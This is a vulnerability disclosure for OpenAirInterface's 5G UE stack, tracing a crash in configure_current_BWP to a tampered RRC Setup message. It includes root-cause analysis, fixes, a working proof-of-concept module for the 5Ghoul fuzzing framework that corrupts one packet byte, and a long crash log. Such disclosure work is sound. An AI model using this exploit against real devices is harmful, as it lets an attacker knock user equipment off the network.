# mac_sch_3__LogicalChannelConfig_ul_SpecificParameters_reencoded_0_report
**Vulnerability Source Code**
https://gitlab.eurecom.fr/oai/openairinterface5g/-/blob/0afa3f3193f77ce718148ca48cbf18b321d1cf23/openair2/LAYER2/NR_MAC_UE/config_ue.c#L609

```
AssertFatal(1==0,"We shouldn't end here in configuring BWP\n");
```

**Vulnerability Analysis: Vulnerability in 5G UE Connection Handling**

**Overview:**
The crash occurs within the 5G UE connection process, specifically during the RRC connection setup phase when a tampered packet is sent from the base station (gNB). The GDB log indicates that the `TASK_RRC_NRUE` thread received a `SIGABRT` signal, causing the User Equipment (UE)to terminate unexpectedly. This likely points to an unhandled assertion or unexpected null pointer encountered in the code, particularly in the functions `configure_current_BWP`, `nr_rrc_mac_config_req_ue`, and `nr_rrc_ue_process_masterCellGroup`.

Here the base station (gNB) is the sender while the user equipment (UE) is the receiver.

**Root Cause Analysis:**
The backtrace suggests a failure in the `configure_current_BWP` function, specifically when handling configurations associated with Bandwidth Parts (BWP) and ServingCellConfigCommon (SCC) parameters. The function `configure_current_BWP` sets up BWP configurations using the values from `NR_CellGroupConfig_t` or `NR_ServingCellConfigCommonSIB_t`. If these structures are misconfigured or contain null pointers, it may lead to dereference errors or assert failures in configuration processing. This issue could stem from incomplete validation of configuration structures, especially when they contain optional fields that may not be initialized or are corrupted by a tampered packet.

**Exploitation Potential:**
An attacker could potentially exploit this vulnerability by crafting specific packets that disrupt BWP configuration fields within the RRC connection setup phase. By sending tampered values for `cell_group_config`, `scell_group_config`, or `scc_SIB`, an attacker might trigger null pointer dereferences, and cause misconfigurations. This will result in denial of service (DoS) by repeatedly crashing the UE process or could theoretically be leveraged for further exploitation if other memory-related issues are discovered (e.g., buffer overflows).

**Recommendations:**
1. **Enhanced Validation**: Strengthen validation and sanity checks for configuration structures, particularly for optional fields and external inputs, before processing.
2. **Exception Handling**: Implement robust exception handling within `configure_current_BWP` to prevent abrupt termination when configuration data is incomplete or corrupted.

**Malformed Packet Send From the Base Station**
![Malformed Packet](https://github.com/qiqingh/OAI_Code_Analysis/blob/main/mac_sch_3__LogicalChannelConfig_ul_SpecificParameters_reencoded_0/3_0_pcap.png)

**PoC Code**
The following PoC code generates a falsified packet sent from the Base Station (sender) to the User Equipment (receiver). Due to a vulnerability in the User Equipment, this packet causes the device to crash, resulting in a Denial of Service (DoS).

To compile and run this PoC code, you'll need the environment described here: https://github.com/asset-group/5ghoul-5g-nr-attacks?tab=readme-ov-file#4--create-your-own-5g-exploits-test-cases

```cpp
#include <ModulesInclude.hpp>

// Filters
wd_filter_t f1;

// Vars

const char *module_name()
{
    return "Mediatek";
}

// Setup
int setup(wd_modules_ctx_t *ctx)
{
    // Change required configuration for exploit
    ctx->config->fuzzing.global_timeout = false;

    // Declare filters
    f1 = wd_filter("nr-rrc.rrcSetup_element");

    return 0;
}

// TX
int tx_pre_dissection(uint8_t *pkt_buf, int pkt_length, wd_modules_ctx_t *ctx)
{
    // Register filters
    wd_register_filter(ctx->wd, f1);

    return 0;
}

int tx_post_dissection(uint8_t *pkt_buf, int pkt_length, wd_modules_ctx_t *ctx)
{
    if (wd_read_filter(ctx->wd, f1)) {
        wd_log_y("Malformed rrc setup sent!");
        pkt_buf[83 - 48] = 0x80;
        return 1;
    }

    return 0;
}
```


**Crash Event Log:**

```console
[2024-10-10 18:36:09.007681] [Open5GS] Subscribers registered to core network: 14
[2024-10-10 18:36:09.381906] [!] Simulation Enabled, disabling ModemManager and HubCtrl. Remember to enabled them later!
[2024-10-10 18:36:10.389615] Starting OAI UE Simulator (RFSIM)
[2024-10-10 18:36:10.399719] [!] UE process started
[2024-10-10 18:36:10.415201] [GlobalTimeout] Not enabled in config. file
[2024-10-10 18:36:10.415248] [AnomalyReport] Added Logging Sink: PacketLogger
[2024-10-10 18:36:10.415256] [AnomalyReport] Added Logging Sink: SvcReportSender
[2024-10-10 18:36:10.415261] [USBHubControl] Disabled in config. file
[2024-10-10 18:36:10.415267] [ModemManager] ModemManager not started!
[2024-10-10 18:36:10.415272] [ReportSender] Credentials file not found: modules/reportsender/credentials.json
[2024-10-10 18:36:10.415278] [ReportSender] Ready
[2024-10-10 18:36:10.415283] [Optimizer] Optimization disabled. Using default population:
[2024-10-10 18:36:10.415288] --------------------------------------------------------
[2024-10-10 18:36:10.415294] [Optimizer] Iter=1  Params=[0.2,0.2,0.2,0.2,0.2,0.2,...,0.2]
[2024-10-10 18:36:10.415299] [Optimizer] Fitness=1e+06  Adj. Fitness=-1e+06
[2024-10-10 18:36:10.415304] --------------------------------------------------------
[2024-10-10 18:36:10.415310] [Optimizer] Initialized with X Size=293, Population Size=5
[2024-10-10 18:36:10.415316] [Main] Fuzzing not enabled! Running only target reconnection
[2024-10-10 18:36:10.415321] [PacketHandler] Added "proto:nas-5gs", Dir:0, Realtime:0, TID:440937
[2024-10-10 18:36:10.415326] [PacketHandler] Added "proto:nas-5gs", Dir:1, Realtime:0, TID:440938
[2024-10-10 18:36:10.415335] [PacketHandler] Added "proto:pdcp-nr-framed", Dir:0, Realtime:1, TID:440939
[2024-10-10 18:36:10.415343] [PacketHandler] Added "proto:pdcp-nr-framed", Dir:1, Realtime:1, TID:440940
[2024-10-10 18:36:10.425430] [PacketHandler] Added "proto:mac-nr-framed", Dir:0, Realtime:1, TID:440941
[2024-10-10 18:36:10.425477] [PacketHandler] Added "proto:mac-nr-framed", Dir:0, Realtime:1, TID:440942
[2024-10-10 18:36:10.425482] [PacketHandler] Added "proto:mac-nr-framed", Dir:1, Realtime:0, TID:440943
[2024-10-10 18:36:11.082658] [Main] eNB/gNB started!
[2024-10-10 18:36:11.082719] [!] Waiting UE task to start...
[2024-10-10 18:36:13.670728] [UE] Found RAR. Connection Timeout: 1000 MS
[2024-10-10 18:36:13.670764] --------------------------------------------------------
[2024-10-10 18:36:13.670774] [Optimizer] Iter=1  Params=[0.2,0.2,0.2,0.2,0.2,0.2,...,0.2]
[2024-10-10 18:36:13.670781] [Optimizer] Fitness=2  Adj. Fitness=-2
[2024-10-10 18:36:13.670788] --------------------------------------------------------
[2024-10-10 18:36:13.670796] [M] TX --> RRC Setup  (Padding 62 bytes) 
[2024-10-10 18:36:13.766692] [!] UE process stopped
[2024-10-10 18:36:13.766956] [!] UE process crashed
[2024-10-10 18:36:13.766978] [AnomalyReport] [Crash] Service stopped at state "TX / RRC / rrcSetup"
[2024-10-10 18:36:13.766992] [PacketLogger] Packet Number:8, Comment: [Crash] Service stopped at state "TX / RRC / rrcSetup"
[2024-10-10 18:36:13.777070] [M] TX --> RRC Setup  (Padding 62 bytes) 
[2024-10-10 18:36:13.787176] [M] TX --> RRC Setup  (Padding 62 bytes) 
[2024-10-10 18:36:13.807361] [M] TX --> RRC Setup  (Padding 62 bytes) 
[2024-10-10 18:36:13.867777] [!] UE process started
[2024-10-10 18:36:13.948409] [AlertSender:Gmail] Creating token.json
[2024-10-10 18:36:14.663250] [UE] Restarting connection...
[2024-10-10 18:36:14.663319] [!] UE process stopped
[2024-10-10 18:36:14.824350] [!] UE process started
[2024-10-10 18:36:18.080759] [UE] Found RAR. Connection Timeout: 1000 MS
[2024-10-10 18:36:18.080883] --------------------------------------------------------
[2024-10-10 18:36:18.080904] [Optimizer] Iter=2  Params=[0.2,0.2,0.2,0.2,0.2,0.2,...,0.2]
[2024-10-10 18:36:18.080910] [Optimizer] Fitness=2  Adj. Fitness=-2
[2024-10-10 18:36:18.080915] --------------------------------------------------------
[2024-10-10 18:36:18.080921] [M] TX --> RRC Setup  (Padding 62 bytes) 
[2024-10-10 18:36:18.171477] [!] UE process stopped
[2024-10-10 18:36:18.178828] [!] UE process crashed
[2024-10-10 18:36:18.178837] [AnomalyReport] [Crash] Service stopped at state "TX / RRC / rrcSetup"
[2024-10-10 18:36:18.178843] [PacketLogger] Packet Number:22, Comment: [Crash] Service stopped at state "TX / RRC / rrcSetup"
[2024-10-10 18:36:18.188905] [M] TX --> RRC Setup  (Padding 62 bytes) 
[2024-10-10 18:36:18.199002] [M] TX --> RRC Setup  (Padding 62 bytes) 
[2024-10-10 18:36:18.219172] [M] TX --> RRC Setup  (Padding 62 bytes) 
[2024-10-10 18:36:18.279614] [!] UE process started
[2024-10-10 18:36:18.358440] [AlertSender:Gmail] Creating token.json
[2024-10-10 18:36:19.083395] [UE] Restarting connection...
[2024-10-10 18:36:19.083451] [!] UE process stopped
[2024-10-10 18:36:19.234457] [!] UE process started
[2024-10-10 18:36:22.449966] [UE] Found RAR. Connection Timeout: 1000 MS
[2024-10-10 18:36:22.452696] --------------------------------------------------------
[2024-10-10 18:36:22.452705] [Optimizer] Iter=3  Params=[0.2,0.2,0.2,0.2,0.2,0.2,...,0.2]
[2024-10-10 18:36:22.452711] [Optimizer] Fitness=2  Adj. Fitness=-2
[2024-10-10 18:36:22.452716] --------------------------------------------------------
[2024-10-10 18:36:22.452722] [M] TX --> RRC Setup  (Padding 62 bytes) 
[2024-10-10 18:36:22.533268] [!] UE process stopped
[2024-10-10 18:36:22.541567] [!] UE process crashed
[2024-10-10 18:36:22.541592] [AnomalyReport] [Crash] Service stopped at state "TX / RRC / rrcSetup"
[2024-10-10 18:36:22.541598] [PacketLogger] Packet Number:36, Comment: [Crash] Service stopped at state "TX / RRC / rrcSetup"
[2024-10-10 18:36:22.551664] [M] TX --> RRC Setup  (Padding 62 bytes) 
[2024-10-10 18:36:22.561757] [M] TX --> RRC Setup  (Padding 62 bytes) 
[2024-10-10 18:36:22.581893] [M] TX --> RRC Setup  (Padding 62 bytes) 
[2024-10-10 18:36:22.650423] [!] UE process started
[2024-10-10 18:36:22.731441] [AlertSender:Gmail] Creating token.json
[2024-10-10 18:36:23.446149] [UE] Restarting connection...
[2024-10-10 18:36:23.446205] [!] UE process stopped
[2024-10-10 18:36:23.607678] [!] UE process started
[2024-10-10 18:36:26.839770] [UE] Found RAR. Connection Timeout: 1000 MS
[2024-10-10 18:36:26.839945] --------------------------------------------------------
[2024-10-10 18:36:26.839969] [Optimizer] Iter=4  Params=[0.2,0.2,0.2,0.2,0.2,0.2,...,0.2]
[2024-10-10 18:36:26.839983] [Optimizer] Fitness=2  Adj. Fitness=-2
[2024-10-10 18:36:26.839995] --------------------------------------------------------
[2024-10-10 18:36:26.840006] [M] TX --> RRC Setup  (Padding 62 bytes) 
[2024-10-10 18:36:26.930647] [!] UE process stopped
[2024-10-10 18:36:26.933919] [!] UE process crashed
[2024-10-10 18:36:26.933943] [AnomalyReport] [Crash] Service stopped at state "TX / RRC / rrcSetup"
[2024-10-10 18:36:26.933951] [PacketLogger] Packet Number:50, Comment: [Crash] Service stopped at state "TX / RRC / rrcSetup"
[2024-10-10 18:36:26.944046] [M] TX --> RRC Setup  (Padding 62 bytes) 
[2024-10-10 18:36:26.954174] [M] TX --> RRC Setup  (Padding 62 bytes) 
[2024-10-10 18:36:26.974330] [M] TX --> RRC Setup  (Padding 62 bytes) 
[2024-10-10 18:36:27.043048] [!] UE process started
[2024-10-10 18:36:27.113637] [AlertSender:Gmail] Creating token.json
[2024-10-10 18:36:27.838487] [UE] Restarting connection...
[2024-10-10 18:36:27.838533] [!] UE process stopped
[2024-10-10 18:36:27.989589] [!] UE process started
[2024-10-10 18:36:31.239447] [UE] Found RAR. Connection Timeout: 1000 MS
[2024-10-10 18:36:31.239523] --------------------------------------------------------
[2024-10-10 18:36:31.239530] [Optimizer] Iter=5  Params=[0.2,0.2,0.2,0.2,0.2,0.2,...,0.2]
[2024-10-10 18:36:31.239537] [Optimizer] Fitness=2  Adj. Fitness=-2
[2024-10-10 18:36:31.239542] --------------------------------------------------------
[2024-10-10 18:36:31.239548] [M] TX --> RRC Setup  (Padding 62 bytes) 
[2024-10-10 18:36:31.330097] [!] UE process stopped
[2024-10-10 18:36:31.331446] [!] UE process crashed
[2024-10-10 18:36:31.331459] [AnomalyReport] [Crash] Service stopped at state "TX / RRC / rrcSetup"
[2024-10-10 18:36:31.331472] [PacketLogger] Packet Number:64, Comment: [Crash] Service stopped at state "TX / RRC / rrcSetup"
[2024-10-10 18:36:31.341536] [M] TX --> RRC Setup  (Padding 62 bytes) 
[2024-10-10 18:36:31.351627] [M] TX --> RRC Setup  (Padding 62 bytes) 
[2024-10-10 18:36:31.371806] [M] TX --> RRC Setup  (Padding 62 bytes) 
[2024-10-10 18:36:31.432225] [!] UE process started
[2024-10-10 18:36:31.512808] [AlertSender:Gmail] Creating token.json
[2024-10-10 18:36:32.237707] [UE] Restarting connection...
[2024-10-10 18:36:32.237766] [!] UE process stopped
[2024-10-10 18:36:32.388886] [!] UE process started
[2024-10-10 18:36:35.626957] [UE] Found RAR. Connection Timeout: 1000 MS
[2024-10-10 18:36:35.629714] --------------------------------------------------------
[2024-10-10 18:36:35.629724] [Optimizer] Iter=6  Params=[0.2,0.2,0.2,0.2,0.2,0.2,...,0.2]
[2024-10-10 18:36:35.629728] [Optimizer] Fitness=2  Adj. Fitness=-2
[2024-10-10 18:36:35.629732] --------------------------------------------------------
[2024-10-10 18:36:35.629736] [M] TX --> RRC Setup  (Padding 62 bytes) 
[2024-10-10 18:36:35.710278] [!] UE process stopped
[2024-10-10 18:36:35.718781] [!] UE process crashed
[2024-10-10 18:36:35.718801] [AnomalyReport] [Crash] Service stopped at state "TX / RRC / rrcSetup"
[2024-10-10 18:36:35.718808] [PacketLogger] Packet Number:78, Comment: [Crash] Service stopped at state "TX / RRC / rrcSetup"
[2024-10-10 18:36:35.728876] [M] TX --> RRC Setup  (Padding 62 bytes) 
[2024-10-10 18:36:35.738971] [M] TX --> RRC Setup  (Padding 62 bytes) 
[2024-10-10 18:36:35.759146] [M] TX --> RRC Setup  (Padding 62 bytes) 
[2024-10-10 18:36:35.819598] [!] UE process started
[2024-10-10 18:36:35.899119] [AlertSender:Gmail] Creating token.json
[2024-10-10 18:36:36.625158] [UE] Restarting connection...
[2024-10-10 18:36:36.625235] [!] UE process stopped
[2024-10-10 18:36:36.776388] [!] UE process started
[2024-10-10 18:36:40.017267] [UE] Found RAR. Connection Timeout: 1000 MS
[2024-10-10 18:36:40.020058] --------------------------------------------------------
[2024-10-10 18:36:40.020080] [Optimizer] Iter=7  Params=[0.2,0.2,0.2,0.2,0.2,0.2,...,0.2]
[2024-10-10 18:36:40.020093] [Optimizer] Fitness=2  Adj. Fitness=-2
[2024-10-10 18:36:40.020106] --------------------------------------------------------
[2024-10-10 18:36:40.020117] [M] TX --> RRC Setup  (Padding 62 bytes) 
[2024-10-10 18:36:40.100708] [!] UE process stopped
[2024-10-10 18:36:40.108000] [!] UE process crashed
[2024-10-10 18:36:40.108020] [AnomalyReport] [Crash] Service stopped at state "TX / MAC-NR / UE Contention Resolution Identity"
[2024-10-10 18:36:40.108038] [PacketLogger] Packet Number:92, Comment: [Crash] Service stopped at state "TX / MAC-NR / UE Contention Resolution Identity"
[2024-10-10 18:36:40.118117] [M] TX --> RRC Setup  (Padding 62 bytes) 
[2024-10-10 18:36:40.128251] [M] TX --> RRC Setup  (Padding 62 bytes) 
[2024-10-10 18:36:40.148433] [M] TX --> RRC Setup  (Padding 62 bytes) 
[2024-10-10 18:36:40.208792] [!] UE process started
[2024-10-10 18:36:40.231201] [UE] Found RAR. Connection Timeout: 1000 MS
[2024-10-10 18:36:40.231257] [UE] Found RAR. Connection Timeout: 1000 MS
[2024-10-10 18:36:40.231282] [UE] Found RAR. Connection Timeout: 1000 MS
[2024-10-10 18:36:40.301750] [AlertSender:Gmail] Creating token.json
[2024-10-10 18:36:41.228862] [UE] Restarting connection...
[2024-10-10 18:36:41.228926] [!] UE process stopped
[2024-10-10 18:36:41.390020] [!] UE process started
[2024-10-10 18:36:41.400211] [UE] Found RAR. Connection Timeout: 1000 MS
[2024-10-10 18:36:42.397066] [UE] Restarting connection...
[2024-10-10 18:36:42.397131] [!] UE process stopped
[2024-10-10 18:36:42.558260] [!] UE process started
[2024-10-10 18:36:45.792097] [UE] Found RAR. Connection Timeout: 1000 MS
[2024-10-10 18:36:45.802283] --------------------------------------------------------
[2024-10-10 18:36:45.802335] [Optimizer] Iter=8  Params=[0.2,0.2,0.2,0.2,0.2,0.2,...,0.2]
[2024-10-10 18:36:45.802341] [Optimizer] Fitness=3  Adj. Fitness=-3
[2024-10-10 18:36:45.802351] --------------------------------------------------------
[2024-10-10 18:36:45.802359] [M] TX --> RRC Setup  (Padding 62 bytes) 
[2024-10-10 18:36:45.889457] [!] UE process stopped
[2024-10-10 18:36:45.889878] [!] UE process crashed
[2024-10-10 18:36:45.889887] [AnomalyReport] [Crash] Service stopped at state "TX / RRC / rrcSetup"
[2024-10-10 18:36:45.889895] [PacketLogger] Packet Number:107, Comment: [Crash] Service stopped at state "TX / RRC / rrcSetup"
[2024-10-10 18:36:45.899961] [M] TX --> RRC Setup  (Padding 62 bytes) 
[2024-10-10 18:36:45.910417] [M] TX --> RRC Setup  (Padding 62 bytes) 
[2024-10-10 18:36:45.930615] [M] TX --> RRC Setup  (Padding 62 bytes) 
[2024-10-10 18:36:45.991045] [!] UE process started
[2024-10-10 18:36:46.059632] [AlertSender:Gmail] Creating token.json

```
